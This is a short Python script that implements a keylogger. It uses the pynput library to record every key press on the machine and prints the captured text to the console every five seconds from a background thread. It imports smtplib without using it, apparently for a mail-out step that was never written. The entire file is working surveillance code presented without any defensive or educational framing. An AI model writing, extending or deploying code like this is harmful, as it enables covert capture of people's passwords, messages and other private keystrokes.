from pynput import keyboard
import time
import threading
import smtplib

# Class that keylogs the keyboard of the user

class Keylogger:
    def __init__(self):
        self.log = ""

    def logging(self, key):
        try:
            self.log += key.char

        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += " " + str(key) + " "


    def preview_logged(self):
        while True:
            time.sleep(5)
            print(self.log)
            self.log = ""

    def keylogger(self):
        with keyboard.Listener(on_press=self.logging) as listener:
            log_thread = threading.Thread(target=self.preview_logged)
            log_thread.start()
            listener.join()



keylogger = Keylogger()
keylogger.keylogger()
